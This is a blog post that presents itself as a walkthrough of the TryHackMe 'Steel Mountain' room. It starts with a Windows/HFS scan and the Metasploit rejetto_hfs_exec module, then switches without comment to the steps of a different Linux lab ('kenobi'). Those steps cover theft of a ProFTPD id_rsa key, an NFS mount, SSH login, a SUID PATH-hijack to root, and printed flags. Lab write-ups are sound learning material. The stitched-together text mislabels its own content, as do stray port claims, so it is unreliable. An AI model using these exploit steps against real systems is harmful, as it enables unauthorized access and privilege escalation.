---
date: 2025-08-08 23:38
layout: post
title: Steel Mountain
subtitle: Steel Mountain for TyHackMe Writeup.
description: >-
  in this blog i've explained how to root Steel Mountain from TryHackMe
image: https://tryhackme-images.s3.amazonaws.com/room-icons/c9030a2b60bb7d1cf4fcb6e5032526d3.jpeg
optimized_image:https://tryhackme-images.s3.amazonaws.com/room-icons/c9030a2b60bb7d1cf4fcb6e5032526d3.jpeg
category: tryhackme
tags:
  - tryhackme
  - injection
author: Mustafa Altayeb
paginate: true
---


# Room Name [Steel Mountain](https://tryhackme.com/room/steelmountain "Steel Mountain")




This room will cover gaining initial access to a Windows machine inspired by Mr. Robot using Metasploit, performing privilege escalation enumeration with PowerShell, and exploiting a Windows misconfiguration to gain Administrator access.

----

# Objective of room

This room will cover 
1. Gain initial access to a Mr. Robot-themed Windows machine using Metasploit.
2. Use PowerShell to enumerate privilege escalation vectors manually.
3. Exploit a Windows misconfiguration to escalate privileges and gain Administrator access.
----

# RECON 

# Nmap

----

## First Scan
>**nmap -p- -sCV -T5 10.10.195.17**

Result:

```js
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2025-08-06T16:34:51
|_Not valid after:  2026-02-05T16:34:51
|_ssl-date: 2025-08-07T16:36:58+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2025-08-07T16:36:53+00:00
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49164/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:54:D1:5F:A1:53 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows


```
33 We got ssh on port 22 and ftp on port 21 and http on port 80 and rpcbind on port 111 and smbd on port 139 & 445
-----

nmap found `http`(80), `msrpc`(135),`netbios-ssn` (139),`microsoft-ds` (445),`http` (3389), `http` (5985), `HttpFileServer` (8080)

# By Discovring all i found:

>**http://10.10.195.17:80**

![](/assets/TryHackMeRoomsImage/STEELMOUNTAIN/Billhrabar.png)

>**http://10.10.195.17:80**

![](/assets/TryHackMeRoomsImage/STEELMOUNTAIN/server2.png)
 
 > I find this link in http://www.rejetto.com/hfs/
 >  Server information HttpFileServer 2.3

## METASPLOIT ACCESS

>**start msfconsole and search for `rejetto`**

 ```js
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

```
>USE 0

Set `RHOSTS` , `RPORT`

```js
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.195.17
rhosts => 10.10.195.17
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
rport => 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > run
```

>RUN 

## Gain Access
# SMB Enumeration

>**nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.194.61 **

```js
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.23.89\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.23.89\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.23.89\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>



```
We have 

```js
\\10.10.23.89\anonymous
```
## Try to connect with SMB via anonymous


>**smbclient //10.10.23.89/anonymous**

```js
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.3 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ smbclient //10.10.23.89/anonymous
Password for [WORKGROUP\mustafa]:
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019
m
		9204224 blocks of size 1024. 6877104 blocks available
smb: \> mget log.txt
Get file log.txt? y
getting file \log.txt of size 12237 as log.txt (13.8 KiloBytes/sec) (average 13.8 KiloBytes/sec)
smb: \> 
```
----

## we get log.txt it has sensitive information 
path of ssh id_rsa &rarr; /home/kenobi/.ssh/id_rsa

# rpcbind Enumeration
we have rpcbind service running on port 111 

>**nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount**

```js
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.3 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ ~ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.23.89
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-06 22:54 EEST
Nmap scan report for 10.10.23.89
Host is up (0.10s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

```
-----

## We have var Directoy and know the FTP version ProFTPD 1.3.5 
Go to [exploit-db](http://https://www.exploit-db.com/ "exploit-db") and search for exploit or use Searchsploit

# Connect to FTP via nc on port 21

```js
telnet 10.10.194.61 21

```

>**now we will copy the ssh id_rsa from /home/kenobi/.ssh/id_rsa to /var/tmp/**

```js
telnet 10.10.194.61 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.194.61]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful

```
go to folder /mnt

>**sudo mount -t nfs 10.10.23.89:/var /mnt**

```js

💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.3 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ /mnt cd tmp
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.3 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ /mnt/tmp ls
id_rsa
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
systemd-private-b168a848f5f4485c97aa4dedc11c7c6e-systemd-timesyncd.service-iAn4C5
systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.3 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ /mnt/tmp chmod 600 id_rsa id_rsa id_rsa  
chmod: changing permissions of 'id_rsa': Read-only file system


```
>**Use id_rsa to connect to ssh**

```js
💻 T4T4R1S 🌐 | Local IP ➜ 192.168.1.3 | 🥷 VPN IP ➜ 10.11.139.85
👀  ➜ /mnt/tmp sudo ssh -i id_rsa kenobi@10.10.23.89
Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
cat user.txt
d0b0f3f53b6caa532a83915e19224899
```

-----


# Time for some privilege escalation 

----

## SUID 
(Set owner User ID up on execution) is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherits access permissions from the logged in user.


### Use 
 >**find / -type f -perm -u=s 2>/dev/null**
to search for files with a misconfigured SUID let us to get root privileges

```js
kenobi@kenobi:~$ find / -type f -perm -u=s 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
kenobi@kenobi:~$
```

## The /usr/bin/menu file looks intersest. Let's run this binary. we get this output with 3 options to select:

```js
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```
## In 1. status check like curl.
we make can file and name it as curl and copy /bin/bash to it then make it  readable, writeable and executable then add the path of curl file to bash shell of the system path

```js
kenobi@kenobi:/tmp$ echo /bin/bash > curl 
kenobi@kenobi:/tmp$ chmod +x curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

# Search for root flag

```js
root@kenobi:/# cd root
root@kenobi:/root# ls
root.txt
root@kenobi:/root# cat root.txt
177b3cd8562289f37382721c28381f02
root@kenobi:/root# 
```


<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>